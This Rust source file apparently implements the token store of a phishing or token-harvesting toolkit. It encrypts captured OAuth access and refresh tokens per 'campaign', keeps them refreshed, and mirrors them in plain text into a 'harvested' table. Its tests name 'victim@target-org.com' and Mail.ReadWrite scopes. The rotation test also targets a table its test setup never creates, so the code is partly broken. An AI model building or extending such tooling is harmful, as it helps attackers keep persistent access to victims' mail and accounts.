use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use pbkdf2::pbkdf2_hmac;
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use sqlx::SqlitePool;

const SALT_LEN: usize = 16;
const NONCE_LEN: usize = 12;
const KEY_LEN: usize = 32;
const PBKDF2_ITERATIONS: u32 = 100_000;

/// Decrypted token returned from the vault.
#[derive(Debug, Serialize, Deserialize)]
pub struct DecryptedToken {
    pub id: String,
    pub campaign_id: String,
    pub user_email: String,
    pub access_token: String,
    pub refresh_token: String,
    pub scopes: Vec<String>,
    pub expires_at: DateTime<Utc>,
    pub created_at: DateTime<Utc>,
    pub last_refreshed_at: Option<DateTime<Utc>>,
    pub account_type: Option<String>,
}

/// Token vault using AES-256-GCM with per-entry PBKDF2-derived keys.
#[derive(Clone)]
pub struct Vault {
    master_secret: Vec<u8>,
}

impl Vault {
    pub fn new(master_secret: String) -> Self {
        Self {
            master_secret: master_secret.into_bytes(),
        }
    }

    fn derive_key(&self, salt: &[u8]) -> [u8; KEY_LEN] {
        let mut key = [0u8; KEY_LEN];
        pbkdf2_hmac::<Sha256>(&self.master_secret, salt, PBKDF2_ITERATIONS, &mut key);
        key
    }

    /// Encrypt plaintext. Returns (salt, nonce||ciphertext||tag).
    pub fn encrypt(&self, plaintext: &str) -> Result<(Vec<u8>, Vec<u8>)> {
        let mut salt = vec![0u8; SALT_LEN];
        rand::thread_rng().fill_bytes(&mut salt);

        let key = self.derive_key(&salt);
        let cipher = Aes256Gcm::new_from_slice(&key)
            .context("Failed to create AES-256-GCM cipher")?;

        let mut nonce_bytes = [0u8; NONCE_LEN];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        let ciphertext = cipher
            .encrypt(nonce, plaintext.as_bytes())
            .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;

        let mut blob = Vec::with_capacity(NONCE_LEN + ciphertext.len());
        blob.extend_from_slice(&nonce_bytes);
        blob.extend_from_slice(&ciphertext);

        Ok((salt, blob))
    }

    /// Decrypt a blob produced by `encrypt`.
    pub fn decrypt(&self, ciphertext_blob: &[u8], salt: &[u8]) -> Result<String> {
        if ciphertext_blob.len() < NONCE_LEN {
            anyhow::bail!("Ciphertext blob too short");
        }

        let key = self.derive_key(salt);
        let cipher = Aes256Gcm::new_from_slice(&key)
            .context("Failed to create AES-256-GCM cipher")?;

        let nonce = Nonce::from_slice(&ciphertext_blob[..NONCE_LEN]);
        let ciphertext = &ciphertext_blob[NONCE_LEN..];

        let plaintext = cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| anyhow::anyhow!("Decryption failed: {}", e))?;

        String::from_utf8(plaintext).context("Invalid UTF-8 in decrypted token")
    }

    /// Store a new token, encrypting access and refresh tokens.
    pub async fn store_token(
        &self,
        pool: &SqlitePool,
        campaign_id: &str,
        user_email: &str,
        access_token: &str,
        refresh_token: &str,
        scopes: Vec<String>,
        expires_at: DateTime<Utc>,
        account_type: Option<&str>,
    ) -> Result<String> {
        let id = uuid::Uuid::new_v4().to_string();

        let (access_salt, encrypted_access) = self
            .encrypt(access_token)
            .context("Failed to encrypt access token")?;
        let (refresh_salt, encrypted_refresh) = self
            .encrypt(refresh_token)
            .context("Failed to encrypt refresh token")?;

        let scopes_json = serde_json::to_string(&scopes).unwrap_or_else(|_| "[]".to_string());
        let created_at = Utc::now();

        sqlx::query(
            r#"
            INSERT INTO tokens (
                id, campaign_id, user_email,
                encrypted_access_token, encrypted_refresh_token,
                access_salt, refresh_salt,
                scopes, expires_at, created_at, last_refreshed_at, account_type
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            "#,
        )
        .bind(&id)
        .bind(campaign_id)
        .bind(user_email)
        .bind(&encrypted_access)
        .bind(&encrypted_refresh)
        .bind(&access_salt)
        .bind(&refresh_salt)
        .bind(&scopes_json)
        .bind(expires_at)
        .bind(created_at)
        .bind(Option::<DateTime<Utc>>::None)
        .bind(account_type)
        .execute(pool)
        .await
        .context("Failed to insert token into database")?;

        Ok(id)
    }

    /// Retrieve and decrypt a token by ID.
    pub async fn retrieve_token(&self, pool: &SqlitePool, id: &str) -> Result<DecryptedToken> {
        #[derive(sqlx::FromRow)]
        struct TokenRow {
            id: String,
            campaign_id: String,
            user_email: String,
            encrypted_access_token: Vec<u8>,
            encrypted_refresh_token: Vec<u8>,
            access_salt: Vec<u8>,
            refresh_salt: Vec<u8>,
            scopes: String,
            expires_at: DateTime<Utc>,
            created_at: DateTime<Utc>,
            last_refreshed_at: Option<DateTime<Utc>>,
            account_type: Option<String>,
        }

        let row: TokenRow = sqlx::query_as(
            r#"
            SELECT
                id, campaign_id, user_email,
                encrypted_access_token, encrypted_refresh_token,
                access_salt, refresh_salt,
                scopes, expires_at, created_at, last_refreshed_at, account_type
            FROM tokens WHERE id = ?
            "#,
        )
        .bind(id)
        .fetch_one(pool)
        .await
        .context("Token not found in database")?;

        let access_token = self
            .decrypt(&row.encrypted_access_token, &row.access_salt)
            .context("Failed to decrypt access token")?;
        let refresh_token = self
            .decrypt(&row.encrypted_refresh_token, &row.refresh_salt)
            .context("Failed to decrypt refresh token")?;

        let scopes: Vec<String> = serde_json::from_str(&row.scopes).unwrap_or_default();

        Ok(DecryptedToken {
            id: row.id,
            campaign_id: row.campaign_id,
            user_email: row.user_email,
            access_token,
            refresh_token,
            scopes,
            expires_at: row.expires_at,
            created_at: row.created_at,
            last_refreshed_at: row.last_refreshed_at,
            account_type: row.account_type,
        })
    }

    /// Rotate tokens (e.g., after refresh). Re-encrypts and updates expiry.
    pub async fn rotate_refresh_token(
        &self,
        pool: &SqlitePool,
        id: &str,
        new_access: &str,
        new_refresh: &str,
        new_expiry: DateTime<Utc>,
    ) -> Result<()> {
        let (access_salt, encrypted_access) = self
            .encrypt(new_access)
            .context("Failed to encrypt new access token")?;
        let (refresh_salt, encrypted_refresh) = self
            .encrypt(new_refresh)
            .context("Failed to encrypt new refresh token")?;

        let now = Utc::now();

        // Update encrypted tokens table (vault)
        sqlx::query(
            r#"
            UPDATE tokens
            SET encrypted_access_token = ?,
                encrypted_refresh_token = ?,
                access_salt = ?,
                refresh_salt = ?,
                expires_at = ?,
                last_refreshed_at = ?
            WHERE id = ?
            "#,
        )
        .bind(&encrypted_access)
        .bind(&encrypted_refresh)
        .bind(&access_salt)
        .bind(&refresh_salt)
        .bind(new_expiry)
        .bind(now)
        .bind(id)
        .execute(pool)
        .await
        .context("Failed to update rotated token")?;

        // Also update harvested table (legacy plain-text storage) as fallback
        sqlx::query(
            r#"
            UPDATE harvested
            SET access_token = ?,
                refresh_token = ?,
                expires_at = ?,
                last_refreshed_at = ?
            WHERE id = ?
            "#,
        )
        .bind(new_access)
        .bind(new_refresh)
        .bind(new_expiry)
        .bind(now)
        .bind(id)
        .execute(pool)
        .await
        .context("Failed to update harvested token")?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use sqlx::sqlite::SqlitePoolOptions;

    async fn setup_test_db() -> SqlitePool {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .expect("Failed to create in-memory pool");

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active',
                account_type TEXT
            )
            "#,
        )
        .execute(&pool)
        .await
        .expect("Failed to create test table");

        pool
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let vault = Vault::new("test_master_secret_12345".to_string());
        let plaintext = "super_secret_access_token_xyz_!!!";

        let (salt, ciphertext) = vault.encrypt(plaintext).unwrap();
        assert_eq!(salt.len(), SALT_LEN);
        assert!(ciphertext.len() > NONCE_LEN);

        let decrypted = vault.decrypt(&ciphertext, &salt).unwrap();
        assert_eq!(plaintext, decrypted);
    }

    #[tokio::test]
    async fn test_store_and_retrieve_token() {
        let pool = setup_test_db().await;
        let vault = Vault::new("test_master_secret_for_db".to_string());

        let id = vault
            .store_token(
                &pool,
                "campaign_123",
                "victim@target-org.com",
                "access_token_abc_123",
                "refresh_token_xyz_456",
                vec!["Mail.ReadWrite".to_string(), "User.Read".to_string()],
                Utc::now() + chrono::Duration::hours(1),
                Some("enterprise"),
            )
            .await
            .expect("Failed to store token");

        assert!(!id.is_empty());

        let token = vault
            .retrieve_token(&pool, &id)
            .await
            .expect("Failed to retrieve token");

        assert_eq!(token.campaign_id, "campaign_123");
        assert_eq!(token.user_email, "victim@target-org.com");
        assert_eq!(token.access_token, "access_token_abc_123");
        assert_eq!(token.refresh_token, "refresh_token_xyz_456");
        assert_eq!(token.scopes, vec!["Mail.ReadWrite", "User.Read"]);
        assert_eq!(token.account_type, Some("enterprise".to_string()));
        assert!(token.last_refreshed_at.is_none());
    }

    #[tokio::test]
    async fn test_rotate_refresh_token() {
        let pool = setup_test_db().await;
        let vault = Vault::new("test_master_secret_rotate".to_string());

        let id = vault
            .store_token(
                &pool,
                "campaign_456",
                "user@test.com",
                "old_access",
                "old_refresh",
                vec!["Mail.ReadWrite".to_string()],
                Utc::now() + chrono::Duration::hours(1),
                None,
            )
            .await
            .unwrap();

        vault
            .rotate_refresh_token(
                &pool,
                &id,
                "new_access_token_rotated",
                "new_refresh_token_rotated",
                Utc::now() + chrono::Duration::hours(2),
            )
            .await
            .expect("Failed to rotate token");

        let token = vault
            .retrieve_token(&pool, &id)
            .await
            .expect("Failed to retrieve rotated token");

        assert_eq!(token.access_token, "new_access_token_rotated");
        assert_eq!(token.refresh_token, "new_refresh_token_rotated");
        assert!(token.last_refreshed_at.is_some());
    }
}
